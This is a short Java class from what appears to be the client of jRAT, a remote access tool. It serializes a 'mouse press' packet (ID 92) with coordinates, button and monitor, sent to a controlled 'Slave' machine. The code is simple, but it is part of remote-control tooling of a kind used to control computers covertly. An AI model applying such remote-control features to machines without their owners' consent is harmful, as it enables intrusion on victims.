package se.jrat.client.packets.outgoing;

import java.io.DataOutputStream;

import se.jrat.client.Slave;


public class Packet92MousePress extends AbstractOutgoingPacket {

	private int x;
	private int y;
	private int button;
	private int monitor;

	public Packet92MousePress(int x, int y, int button, int monitor) {
		this.x = x;
		this.y = y;
		this.button = button;
		this.monitor = monitor;
	}

	@Override
	public void write(Slave slave, DataOutputStream dos) throws Exception {
		dos.writeInt(x);
		dos.writeInt(y);
		dos.writeInt(button);
		dos.writeInt(monitor);
	}

	@Override
	public byte getPacketId() {
		return 92;
	}

}